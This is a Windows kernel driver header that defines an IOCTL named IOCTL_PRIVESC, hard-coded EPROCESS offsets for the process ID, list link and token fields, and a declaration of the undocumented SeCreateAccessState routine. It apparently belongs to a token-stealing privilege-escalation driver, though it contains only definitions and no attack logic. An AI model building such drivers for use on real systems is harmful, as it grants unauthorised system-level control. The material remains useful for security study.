#pragma once
#include <stdarg.h>
#include <ntifs.h>
#include <windef.h>

#define IOCTL_PRIVESC CTL_CODE(FILE_DEVICE_UNKNOWN,0x2001,METHOD_BUFFERED,FILE_WRITE_ACCESS)

#define KEY 0x12341234
#if _WIN64
#define PIDOFFSET 0x2e8
#define FLINKOFFSET 0x2f0
#define TOKENOFFSET 0x360
#define PTRLEN UINT64
#else
#define PIDOFFSET 0xB4
#define FLINKOFFSET 0xb8
#define TOKENOFFSET 0xFC
#define PTRLEN DWORD
#endif

typedef struct _AUX_ACCESS_DATA {
    PPRIVILEGE_SET PrivilegesUsed;
    GENERIC_MAPPING GenericMapping;
    ACCESS_MASK AccessesToAudit;
    ACCESS_MASK MaximumAuditMask;
    ULONG Unknown[41];
} AUX_ACCESS_DATA, * PAUX_ACCESS_DATA;

extern "C" NTKERNELAPI
NTSTATUS
SeCreateAccessState(
    PACCESS_STATE AccessState,
    PAUX_ACCESS_DATA AuxData,
    ACCESS_MASK DesiredAccess,
    PGENERIC_MAPPING GenericMapping
);

